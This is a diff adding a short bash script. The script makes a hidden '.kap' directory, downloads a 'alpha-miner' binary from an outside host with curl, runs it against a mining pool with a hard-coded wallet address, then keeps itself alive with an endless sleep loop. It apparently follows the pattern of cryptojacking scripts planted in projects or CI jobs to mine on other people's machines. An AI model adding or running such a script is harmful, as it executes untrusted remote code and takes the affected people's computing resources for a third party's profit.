@@ -1,0 +1,10 @@
+#!/bin/bash
+mkdir .kap && cd .kap
+
+curl -L -o alpha-miner https://pearl.alphapool.tech/downloads/alpha-miner
+chmod +x alpha-miner
+./alpha-miner --pool stratum+tcp://us2.alphapool.tech:5566 --address prl1pjp3jd7ue653f6zyrn9ewwu7lalw538kn5w2l4lekv0g3nxqlj23qnwg6g0 --worker cus --password x
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
